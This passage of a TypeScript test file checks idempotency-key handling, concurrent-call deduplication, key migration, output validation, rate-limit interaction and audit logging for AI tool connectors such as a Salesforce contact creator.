        entries.set(key, record);
      }),
    };
    const execute = vi.fn(
      async () => ({ ok: 'not-a-boolean' }) as unknown as { ok: boolean },
    );
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      inputSchema: z.object({ email: z.string() }),
      outputSchema: z.object({ ok: z.boolean() }),
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'invalid-output' });

    // #when — the same key is retried after output validation fails
    if (!tool.execute) throw new Error('tool has no execute');
    const first = await tool.execute(input, context);
    const second = await tool.execute(input, context);

    // #then — neither invalid result was made replayable
    expect(first).toMatchObject({ error: true });
    expect(second).toMatchObject({ error: true });
    expect(execute).toHaveBeenCalledTimes(2);
    expect(store.put).not.toHaveBeenCalled();
    expect(entries).toEqual(new Map());
  });

  it('does not commit a throwing validator result to a non-atomic store', async () => {
    // #given — non-atomic stores have no durable pending state, but must not
    // make a result replayable when validation itself rejects
    const store: IdempotencyStore = {
      get: () => undefined,
      put: vi.fn(),
    };
    const execute = vi.fn(async () => 'completed');
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      inputSchema: z.object({ email: z.string() }),
      outputSchema: standardStringSchema(() => {
        throw new Error('private validator failure');
      }),
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'throwing-validator' });

    // #when / #then — each call reports validation failure and none commits;
    // a non-atomic store cannot retain a cross-call pending reservation
    await expect(run(tool, input, context)).rejects.toThrow(
      'private validator failure',
    );
    await expect(run(tool, input, context)).rejects.toThrow(
      'private validator failure',
    );
    expect(execute).toHaveBeenCalledTimes(2);
    expect(store.put).not.toHaveBeenCalled();
  });

  it('deduplicates concurrent calls sharing a key', async () => {
    // #given
    let release!: () => void;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const execute = vi.fn(async () => {
      await gate;
      return { ok: true };
    });
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when
    const calls = Promise.all([
      run(tool, input, context),
      run(tool, input, context),
    ]);
    release();
    // #then
    expect(await calls).toEqual([{ ok: true }, { ok: true }]);
    expect(execute).toHaveBeenCalledTimes(1);
  });

  // Legacy store whose get() is settled manually — models an async store
  // where a twin lands while the leader's round-trip is still parked.
  function deferredGetStore() {
    let settleGet!: (record: IdempotencyRecord | undefined) => void;
    let first = true;
    const store = {
      get: vi.fn(() => {
        if (!first) return undefined;
        first = false;
        return new Promise<IdempotencyRecord | undefined>((resolve) => {
          settleGet = resolve;
        });
      }),
      put: vi.fn(),
    } satisfies IdempotencyStore;
    return {
      store,
      resolveGet: (record: IdempotencyRecord | undefined) => settleGet(record),
    };
  }

  it('joins a same-isolate twin arriving during the legacy get round-trip', async () => {
    // #given
    const { store, resolveGet } = deferredGetStore();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when — both calls reach the keyed path before get resolves
    const calls = Promise.all([
      run(tool, input, context),
      run(tool, input, context),
    ]);
    await new Promise((resolve) => setTimeout(resolve, 0));
    // #then — the twin joined the leader's placeholder instead of probing
    // the store and racing a second execution
    expect(store.get).toHaveBeenCalledTimes(1);
    resolveGet(undefined);
    expect(await calls).toEqual([{ ok: true }, { ok: true }]);
    expect(execute).toHaveBeenCalledTimes(1);
  });

  it('shares a legacy cached replay with a joined twin', async () => {
    // #given
    const audit = new AuditLogger();
    const { store, resolveGet } = deferredGetStore();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when — the leader's get() resolves to a stored record after the
    // twin has joined
    const calls = Promise.all([
      run(tool, input, context),
      run(tool, input, context),
    ]);
    await new Promise((resolve) => setTimeout(resolve, 0));
    resolveGet({ result: { ok: 'cached' } });
    // #then — both callers get the replay, nothing executes, each call
    // audits its own replayed outcome
    expect(await calls).toEqual([{ ok: 'cached' }, { ok: 'cached' }]);
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'allowed', detail: { replayed: true, idempotencyKey: 'k1' } },
      { decision: 'allowed', detail: { replayed: true, idempotencyKey: 'k1' } },
    ]);
  });

  it('does not cache failed attempts', async () => {
    // #given
    const execute = vi
      .fn(async () => ({ ok: true }))
      .mockRejectedValueOnce(new Error('salesforce 500'));
    const audit = new AuditLogger();
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore(), audit },
    });
    // #when / #then
    await expect(
      run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).rejects.toThrow('salesforce 500');
    expect(
      await run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(2);
    expect(audit.events()).toMatchObject([
      { decision: 'error', detail: { stage: 'execute' } },
      { decision: 'allowed' },
    ]);
  });

  it('rejects both concurrent callers when the shared attempt fails', async () => {
    // #given
    const audit = new AuditLogger();
    let release!: () => void;
    const gate = new Promise<void>((resolve) => {
      release = resolve;
    });
    const execute = vi
      .fn(async () => ({ ok: true }))
      .mockImplementationOnce(async () => {
        await gate;
        throw new Error('salesforce 500');
      });
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore(), audit },
    });
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when
    const first = run(tool, input, context);
    const second = run(tool, input, context);
    release();
    // #then — both reject, nothing cached, the same key retries fresh
    await expect(first).rejects.toThrow('salesforce 500');
    await expect(second).rejects.toThrow('salesforce 500');
    expect(execute).toHaveBeenCalledTimes(1);
    expect(await run(tool, input, context)).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(2);
    expect(audit.events()).toMatchObject([
      { decision: 'error', detail: { stage: 'execute', idempotencyKey: 'k1' } },
      {
        decision: 'error',
        detail: { stage: 'execute', replayed: true, idempotencyKey: 'k1' },
      },
      { decision: 'allowed', detail: { idempotencyKey: 'k1' } },
    ]);
  });

  it('delivers the result and audits when the store put fails', async () => {
    // #given
    const audit = new AuditLogger();
    const store: IdempotencyStore = {
      get: () => undefined,
      put: () => {
        throw new Error(PRIVATE_BACKEND_SENTINEL);
      },
    };
    const execute = vi.fn(async () => ({ ok: true }));
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store, audit },
    });
    // #when / #then — the side effect succeeded; failing the call would
    // invite a retry that duplicates it. The degraded replay protection is
    // visible: the same key executes again.
    expect(
      await run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).toEqual({ ok: true });
    expect(
      await run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(2);
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'idempotency store put failed',
        detail: { stage: 'idempotency-store' },
      },
      { decision: 'allowed', detail: { idempotencyKey: 'k1' } },
      {
        decision: 'error',
        reason: 'idempotency store put failed',
        detail: { stage: 'idempotency-store' },
      },
      { decision: 'allowed', detail: { idempotencyKey: 'k1' } },
    ]);
    expect(JSON.stringify(audit.events())).not.toContain(
      PRIVATE_BACKEND_SENTINEL,
    );
  });

  it('fails closed when the store get fails', async () => {
    // #given
    const audit = new AuditLogger();
    const store: IdempotencyStore = {
      get: () => {
        throw new Error(PRIVATE_BACKEND_SENTINEL);
      },
      put: () => {},
    };
    const execute = vi.fn(async () => ({ ok: true }));
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store, audit },
    });
    // #when / #then
    await expect(
      run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).rejects.toThrow(PRIVATE_BACKEND_SENTINEL);
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'idempotency store inspect failed',
        detail: { stage: 'idempotency-store' },
      },
    ]);
    expect(JSON.stringify(audit.events())).not.toContain(
      PRIVATE_BACKEND_SENTINEL,
    );
  });

  it('scopes keys per connector in a shared store', async () => {
    // #given
    const store = new InMemoryIdempotencyStore();
    const makeShared = (id: string) => {
      const execute = vi.fn(async () => ({ from: id }));
      const tool = createConnector({
        id,
        description: id,
        execute,
        permissions: { sideEffect: 'write', idempotencyKey: true },
        policies: { idempotencyStore: store },
      });
      return { tool, execute };
    };
    const a = makeShared('connector.a');
    const b = makeShared('connector.b');
    const context = makeContext({ idempotencyKey: 'k1' });
    // #when / #then
    expect(await run(a.tool, {}, context)).toEqual({ from: 'connector.a' });
    expect(await run(b.tool, {}, context)).toEqual({ from: 'connector.b' });
    expect(a.execute).toHaveBeenCalledTimes(1);
    expect(b.execute).toHaveBeenCalledTimes(1);
  });

  it('denies an explicitly empty idempotency key the same as a missing one', async () => {
    // #given — key === '' must hit the same deny as an absent key
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: new InMemoryIdempotencyStore() },
    });
    const requestContext = new RequestContext();
    requestContext.set(IDEMPOTENCY_KEY_CONTEXT_KEY, '');
    const context = { requestContext } as unknown as ToolExecutionContext;

    // #when
    const failure = await run(tool, input, context).catch(
      (error: unknown) => error,
    );

    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('idempotency');
    expect(execute).not.toHaveBeenCalled();
  });

  it('treats an empty-string isolation scope as absent (unscoped key)', async () => {
    // #given — isolationScopeOf's length > 0 guard must fold '' to undefined
    const get = vi.fn(() => undefined);
    const put = vi.fn();
    const { tool } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: { get, put } },
    });
    const requestContext = new RequestContext();
    requestContext.set(IDEMPOTENCY_KEY_CONTEXT_KEY, 'k1');
    requestContext.set(ISOLATION_SCOPE_CONTEXT_KEY, '');
    const context = { requestContext } as unknown as ToolExecutionContext;

    // #when
    await run(tool, input, context);

    // #then — the same key as an unscoped call, no scope prefix
    expect(get).toHaveBeenCalledWith('salesforce.createContact:k1');
  });
});

describe('idempotency composite-key migration', () => {
  function migrationContext(
    key: string,
    isolationScope?: string,
  ): ToolExecutionContext {
    const context = makeContext({ idempotencyKey: key });
    if (isolationScope !== undefined) {
      context.requestContext?.set(ISOLATION_SCOPE_CONTEXT_KEY, isolationScope);
    }
    return context;
  }

  function migrationConnector(
    store: IdempotencyStore,
    options: { acknowledged?: boolean; execute?: () => Promise<unknown> } = {},
  ) {
    const execute = vi.fn(options.execute ?? (async () => ({ ok: true })));
    const tool = createConnectorBase({
      id: 'pay',
      description: 'Pay an invoice',
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: {
        idempotencyStore: store,
        ...(options.acknowledged
          ? { idempotencyKeyMigration: 'legacy-writers-drained' as const }
          : {}),
      },
      execute,
    });
    return { tool, execute };
  }

  it('keeps the reported legacy collision distinct under v2', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    try {
      const store = new InMemoryIdempotencyStore();
      const { tool, execute } = migrationConnector(store, {
        acknowledged: true,
      });

      await run(tool, {}, migrationContext('pay:invoice-1', 'tenant'));
      await run(tool, {}, migrationContext('invoice-1', 'tenant:pay'));
      await run(tool, {}, migrationContext('pay:invoice-1', 'tenant'));
      await run(tool, {}, migrationContext('invoice-1', 'tenant:pay'));

      expect(execute).toHaveBeenCalledTimes(2);
    } finally {
      warn.mockRestore();
    }
  });

  it('encodes opaque Unicode, NUL, lone-surrogate, and colon components without delimiters reappearing', async () => {
    const entries = new Map<string, IdempotencyRecord>();
    const put = vi.fn((key: string, record: IdempotencyRecord) => {
      entries.set(key, record);
    });
    const store: IdempotencyStore = {
      get: (key) => entries.get(key),
      put,
    };
    const { tool } = migrationConnector(store, { acknowledged: true });

    await run(tool, {}, migrationContext('键:\0\udc00', '租户:\0\ud800'));

    const storedKey = put.mock.calls[0]?.[0];
    expect(storedKey).toMatch(/^bw2_i_s_[0-9a-f]*_[0-9a-f]+_[0-9a-f]+$/);
    expect(storedKey).not.toContain(':');
  });

  it('replays a provably safe unscoped legacy key without rollout acknowledgement', async () => {
    const store = new InMemoryIdempotencyStore();
    store.put('pay:invoice-1', { result: { source: 'legacy' } });
    const { tool, execute } = migrationConnector(store);

    await expect(run(tool, {}, migrationContext('invoice-1'))).resolves.toEqual(
      { source: 'legacy' },
    );
    expect(execute).not.toHaveBeenCalled();
  });

  it('denies a safe pending legacy key without mutating its reservation', async () => {
    const store = new InMemoryIdempotencyStore();
    const reservation = store.reserve('pay:invoice-1');
    const { tool, execute } = migrationConnector(store);

    await expect(
      run(tool, {}, migrationContext('invoice-1')),
    ).rejects.toMatchObject({ policy: 'idempotency' });
    expect(store.inspect('pay:invoice-1')).toEqual({ state: 'pending' });
    expect(reservation.state).toBe('reserved');
    expect(execute).not.toHaveBeenCalled();
  });

  it('fails closed on an ambiguous completed legacy row even after writers are drained', async () => {
    const warn = vi.spyOn(console, 'warn').mockImplementation(() => {});
    try {
      const store = new InMemoryIdempotencyStore();
      store.put('tenant:pay:pay:invoice-1', {
        result: { source: 'ambiguous' },
      });
      const { tool, execute } = migrationConnector(store, {
        acknowledged: true,
      });

      for (const context of [
        migrationContext('pay:invoice-1', 'tenant'),
        migrationContext('invoice-1', 'tenant:pay'),
      ]) {
        await expect(run(tool, {}, context)).rejects.toMatchObject({
          policy: 'idempotency-key-migration',
        });
      }
      expect(execute).not.toHaveBeenCalled();
    } finally {
      warn.mockRestore();
    }
  });

  it('requires the drained-writer acknowledgement before an absent legacy key can execute', async () => {
    const { tool, execute } = migrationConnector(
      new InMemoryIdempotencyStore(),
    );

    await expect(
      run(tool, {}, migrationContext('invoice-1')),
    ).rejects.toMatchObject({ policy: 'idempotency-key-migration' });
    expect(execute).not.toHaveBeenCalled();
  });

  it('rejects an atomic custom store that cannot inspect legacy pending state', () => {
    const store: AtomicIdempotencyStore = {
      get: () => undefined,
      put: () => {},
      reserve: () => ({ state: 'reserved', token: 'token' }),
      release: () => {},
    };

    expect(() => migrationConnector(store, { acknowledged: true })).toThrow(
      /must implement inspect\(\)/,
    );
  });
});

describe('atomic idempotency (reserve path)', () => {
  function spyAtomicStore() {
    const base = new InMemoryIdempotencyStore();
    return {
      get: vi.fn(base.get.bind(base)),
      put: vi.fn(base.put.bind(base)),
      reserve: vi.fn(base.reserve.bind(base)),
      release: vi.fn(base.release.bind(base)),
    };
  }

  it('claims via reserve() and finalizes with put() — get() is never consulted', async () => {
    // #given
    const store = spyAtomicStore();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    // #when
    await run(tool, input, makeContext({ idempotencyKey: 'k1' }));
    // #then
    expect(store.reserve).toHaveBeenCalledWith(
      expect.stringMatching(/^bw2_i_u_[0-9a-f]+_[0-9a-f]+$/),
    );
    expect(store.put).toHaveBeenCalledTimes(1);
    expect(store.get).not.toHaveBeenCalled();
    expect(execute).toHaveBeenCalledTimes(1);
    // the lease minted by reserve() is exactly the token handed to put() (D2)
    const reservation = store.reserve.mock.results[0]?.value as
      | IdempotencyReservation
      | undefined;
    expect(store.put.mock.calls[0]?.[2]).toBe(
      reservation?.state === 'reserved' ? reservation.token : undefined,
    );
  });

  it('denies honestly when another isolate holds the key', async () => {
    // #given — a store reporting a cross-isolate in-flight execution: a
    // promise cannot be shared across isolates, so the caller is told to
    // retry (the retry replays the winner's stored result)
    const audit = new AuditLogger();
    const store: AtomicIdempotencyStore = {
      get: () => undefined,
      put: () => {},
      reserve: () => ({ state: 'pending' }),
      release: () => {},
    };
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    // #when
    const failure = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k1' }),
    ).catch((error: unknown) => error);
    // #then
    expect(failure).toBeInstanceOf(ConnectorPolicyError);
    expect((failure as ConnectorPolicyError).policy).toBe('idempotency');
    expect((failure as ConnectorPolicyError).reason).toMatch(/in progress/);
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'denied', detail: { policy: 'idempotency' } },
    ]);
  });

  it('replays the reservation-carried record without executing', async () => {
    // #given
    const store: AtomicIdempotencyStore = {
      get: () => undefined,
      put: () => {},
      reserve: () => ({
        state: 'replay',
        record: { result: { ok: 'stored' } },
      }),
      release: () => {},
    };
    const audit = new AuditLogger();
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    // #when / #then
    expect(
      await run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).toEqual({ ok: 'stored' });
    expect(execute).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      { decision: 'allowed', detail: { replayed: true, idempotencyKey: 'k1' } },
    ]);
  });

  it('releases the reservation when execute throws, keeping the key retryable', async () => {
    // #given
    const store = spyAtomicStore();
    const execute = vi
      .fn(async () => ({ ok: true }))
      .mockRejectedValueOnce(new Error('salesforce 500'));
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    // #when / #then — the failure releases; the retry claims fresh
    await expect(
      run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).rejects.toThrow('salesforce 500');
    expect(store.release).toHaveBeenCalledWith(
      expect.stringMatching(/^bw2_i_u_[0-9a-f]+_[0-9a-f]+$/),
      expect.any(String),
    );
    expect(
      await run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).toEqual({ ok: true });
    expect(execute).toHaveBeenCalledTimes(2);
  });

  it('validates output before finalizing and keeps an invalid result pending', async () => {
    // #given — the connector returns a value outside its declared schema
    const audit = new AuditLogger();
    const store = spyAtomicStore();
    const execute = vi.fn(
      async () => ({ ok: 'not-a-boolean' }) as unknown as { ok: boolean },
    );
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      inputSchema: z.object({ email: z.string() }),
      outputSchema: z.object({ ok: z.boolean() }),
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'invalid-output' });

    // #when — the same key is retried after output validation fails
    if (!tool.execute) throw new Error('tool has no execute');
    const first = await tool.execute(input, context);
    const second = await tool
      .execute(input, context)
      .catch((error: unknown) => error);

    // #then — no invalid value is committed, and the pending row blocks an
    // immediate duplicate execution after the side effect may have happened
    expect(first).toMatchObject({ error: true });
    expect(second).toBeInstanceOf(ConnectorPolicyError);
    expect((second as ConnectorPolicyError).policy).toBe('idempotency');
    expect(execute).toHaveBeenCalledTimes(1);
    expect(store.put).not.toHaveBeenCalled();
    expect(store.release).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'connector output validation failed',
        detail: {
          stage: 'output-validation',
          idempotencyKey: 'invalid-output',
        },
      },
      {
        decision: 'denied',
        detail: { policy: 'idempotency' },
      },
    ]);
  });

  it('keeps the reservation pending when the output validator throws', async () => {
    // #given — validation runs after the connector may have completed its
    // side effect, and a Standard Schema validator may reject or throw
    const audit = new AuditLogger();
    const store = spyAtomicStore();
    const execute = vi.fn(async () => 'completed');
    let validations = 0;
    const outputSchema = standardStringSchema((value) => {
      validations += 1;
      if (validations === 1) throw new Error('private validator failure');
      return { value: String(value) };
    });
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      inputSchema: z.object({ email: z.string() }),
      outputSchema,
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'throwing-validator' });

    // #when — the public Mastra boundary propagates the validator failure,
    // then an immediate retry observes the retained pending reservation
    await expect(run(tool, input, context)).rejects.toThrow(
      'private validator failure',
    );
    const second = await run(tool, input, context).catch(
      (error: unknown) => error,
    );

    // #then — the completed side effect is not immediately duplicated
    expect(second).toBeInstanceOf(ConnectorPolicyError);
    expect((second as ConnectorPolicyError).policy).toBe('idempotency');
    expect(execute).toHaveBeenCalledTimes(1);
    expect(validations).toBe(1);
    expect(store.put).not.toHaveBeenCalled();
    expect(store.release).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'connector output validation failed',
        detail: {
          stage: 'output-validation',
          idempotencyKey: 'throwing-validator',
        },
      },
      {
        decision: 'denied',
        detail: { policy: 'idempotency' },
      },
    ]);
  });

  it('does not let a transient validation issue become a public success', async () => {
    // #given — the original validator reports issues once, then would succeed
    // if Mastra invoked it again after Breakwater retained the reservation
    const store = spyAtomicStore();
    const execute = vi.fn(async () => 'completed');
    let validations = 0;
    const outputSchema = standardStringSchema((value) => {
      validations += 1;
      return validations === 1
        ? { issues: [{ message: 'transient issue' }] }
        : { value: String(value) };
    });
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      inputSchema: z.object({ email: z.string() }),
      outputSchema,
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'issue-once' });

    // #when / #then — Mastra consumes Breakwater's captured issues without
    // rerunning the stateful validator, and the retry stays fail-closed
    const first = await run(tool, input, context);
    const second = await run(tool, input, context).catch(
      (error: unknown) => error,
    );
    expect(first).toMatchObject({
      error: true,
      validationErrors: { errors: ['transient issue'] },
    });
    expect(second).toBeInstanceOf(ConnectorPolicyError);
    expect((second as ConnectorPolicyError).policy).toBe('idempotency');
    expect(validations).toBe(1);
    expect(execute).toHaveBeenCalledTimes(1);
    expect(store.put).not.toHaveBeenCalled();
    expect(store.release).not.toHaveBeenCalled();
  });

  it('replays the exact captured transformed result without rerunning the schema', async () => {
    // #given — a stateful transform makes a second schema invocation visible
    const store = spyAtomicStore();
    const execute = vi.fn(async () => 'raw');
    let validations = 0;
    const outputSchema = standardStringSchema((value) => {
      validations += 1;
      return { value: `${String(value)}-${validations}` };
    });
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      inputSchema: z.object({ email: z.string() }),
      outputSchema,
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'transformed-replay' });

    // #when / #then — v2 stores the public result, not the raw connector
    // value; replay neither executes nor transforms it a second time
    expect(await run(tool, input, context)).toBe('raw-1');
    expect(await run(tool, input, context)).toBe('raw-1');
    expect(execute).toHaveBeenCalledTimes(1);
    expect(validations).toBe(1);
    expect(store.put).toHaveBeenCalledWith(
      expect.any(String),
      { result: 'raw-1' },
      expect.any(String),
    );
  });

  it('keeps the reservation pending for an async output validator', async () => {
    // #given — Mastra 1.50 rejects async output schemas at its public boundary
    const audit = new AuditLogger();
    const store = spyAtomicStore();
    const execute = vi.fn(async () => 'completed');
    const validate = vi.fn(async (value: unknown) => ({
      value: String(value),
    }));
    const tool = createConnector({
      id: 'salesforce.createContact',
      description: 'Create a Salesforce contact',
      inputSchema: z.object({ email: z.string() }),
      outputSchema: standardStringSchema(validate),
      execute,
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });
    const context = makeContext({ idempotencyKey: 'async-validator' });

    // #when / #then — validation mirrors that sync-only boundary before
    // any result is committed; the retained pending row blocks duplication
    await expect(run(tool, input, context)).rejects.toThrow(
      'Your schema is async, which is not supported',
    );
    const second = await run(tool, input, context).catch(
      (error: unknown) => error,
    );
    expect(second).toBeInstanceOf(ConnectorPolicyError);
    expect((second as ConnectorPolicyError).policy).toBe('idempotency');
    expect(execute).toHaveBeenCalledTimes(1);
    expect(validate).toHaveBeenCalledTimes(1);
    expect(store.put).not.toHaveBeenCalled();
    expect(store.release).not.toHaveBeenCalled();
    expect(audit.events()).toMatchObject([
      {
        decision: 'error',
        reason: 'connector output validation failed',
        detail: {
          stage: 'output-validation',
          idempotencyKey: 'async-validator',
        },
      },
      {
        decision: 'denied',
        detail: { policy: 'idempotency' },
      },
    ]);
  });

  it('releases the reservation on a rate-limit denial', async () => {
    // #given — budget 1: the second key reserves, then the rate gate denies
    const audit = new AuditLogger();
    const store = spyAtomicStore();
    const { tool, execute } = makeConnector({
      permissions: {
        sideEffect: 'write',
        idempotencyKey: true,
        rateLimit: '1/min',
      },
      policies: {
        audit,
        idempotencyStore: store,
        rateLimitStore: new InMemoryRateLimitStore(),
      },
    });
    // #when
    await run(tool, input, makeContext({ idempotencyKey: 'k1' }));
    const failure = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k2' }),
    ).catch((error: unknown) => error);
    // #then — the denial released k2: no budget consumed, key retryable
    expect((failure as ConnectorPolicyError).policy).toBe('rate-limit');
    expect(store.release).toHaveBeenCalledWith(
      expect.stringMatching(/^bw2_i_u_[0-9a-f]+_[0-9a-f]+$/),
      expect.any(String),
    );
    expect(execute).toHaveBeenCalledTimes(1);
    // #then — exactly two records: k1 allowed, k2 denied once — never a
    // second, false 'execute threw' record for the denial that propagated
    // out of the keyed attempt
    expect(audit.events()).toEqual([
      expect.objectContaining({
        decision: 'allowed',
        detail: expect.objectContaining({ idempotencyKey: 'k1' }),
      }),
      expect.objectContaining({
        decision: 'denied',
        detail: expect.objectContaining({ policy: 'rate-limit' }),
      }),
    ]);
  });

  it('keeps the reservation when put() fails: result delivered, duplicates blocked until the TTL', async () => {
    // #given — an atomic store whose put always fails
    const audit = new AuditLogger();
    const base = new InMemoryIdempotencyStore();
    const store = {
      get: base.get.bind(base),
      put: vi.fn(() => {
        throw new Error('d1 write failed');
      }),
      reserve: base.reserve.bind(base),
      release: vi.fn(base.release.bind(base)),
    };
    const { tool, execute } = makeConnector({
      permissions: { sideEffect: 'write', idempotencyKey: true },
      policies: { audit, idempotencyStore: store },
    });

    // #when — the call succeeds (the side effect already happened) and the
    // reservation is deliberately NOT released...
    expect(
      await run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).toEqual({ ok: true });
    expect(store.release).not.toHaveBeenCalled();

    // #then — ...so a same-key retry is denied 'idempotency' (the pending
    // row blocks duplicates until the stale-pending TTL) without the side
    // effect ever executing twice
    const failure = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k1' }),
    ).catch((error: unknown) => error);
    expect((failure as ConnectorPolicyError).policy).toBe('idempotency');
    expect(execute).toHaveBeenCalledTimes(1);
    expect(audit.events()).toMatchObject([
      { decision: 'error', detail: { stage: 'idempotency-store' } },
      { decision: 'allowed', detail: { idempotencyKey: 'k1' } },
      { decision: 'denied', detail: { policy: 'idempotency' } },
    ]);
  });

  it('audits a keyed rate-limit store crash exactly once and releases the reservation', async () => {
    // #given — a keyed connector whose rate-limit backend crashes inside
    // the reserved attempt
    const audit = new AuditLogger();
    const store = spyAtomicStore();
    const { tool, execute } = makeConnector({
      permissions: {
        sideEffect: 'write',
        idempotencyKey: true,
        rateLimit: '5/min',
      },
      policies: {
        audit,
        idempotencyStore: store,
        rateLimitStore: {
          increment: () => {
            throw new Error('counter backend down');
          },
        },
      },
    });

    // #when / #then — the raw error propagates, execute never ran, and the
    // reservation is released so the key stays retryable
    await expect(
      run(tool, input, makeContext({ idempotencyKey: 'k1' })),
    ).rejects.toThrow('counter backend down');
    expect(execute).not.toHaveBeenCalled();
    expect(store.release).toHaveBeenCalledWith(
      expect.stringMatching(/^bw2_i_u_[0-9a-f]+_[0-9a-f]+$/),
      expect.any(String),
    );
    // #then — exactly ONE audit record, attributed to the rate-limit store;
    // never a second, false 'execute threw' record
    expect(audit.events()).toEqual([
      expect.objectContaining({
        decision: 'error',
        detail: expect.objectContaining({ stage: 'rate-limit-store' }),
      }),
    ]);
  });

  it('audits a keyed rate-limit store PRIMITIVE throw exactly once (wrapped, audit-once holds)', async () => {
    // #given — nothing in the RateLimitStore contract requires Error
    // instances; a primitive throw must not defeat the audit-once WeakSet
    const audit = new AuditLogger();
    const store = spyAtomicStore();
    const { tool, execute } = makeConnector({
      permissions: {
        sideEffect: 'write',
        idempotencyKey: true,
        rateLimit: '5/min',
      },
      policies: {
        audit,
        idempotencyStore: store,
        rateLimitStore: {
          increment: () => {
            // deliberately a bare string throw
            throw 'counter backend down (primitive)';
          },
        },
      },
    });

    // #when / #then — the caller receives an Error carrying the message
    // (the primitive rides on `cause`), execute never ran
    const failure = await run(
      tool,
      input,
      makeContext({ idempotencyKey: 'k1' }),
    ).catch((error: unknown) => error);
    expect(failure).toBeInstanceOf(Error);
    expect((failure as Error).message).toBe('counter backend down (primitive)');
    expect((failure as Error).cause).toBe('counter backend down (primitive)');
    expect(execute).not.toHaveBeenCalled();
    // #then — still exactly ONE audit record; no misattributed second
    // 'execute threw' event
    expect(audit.events()).toEqual([
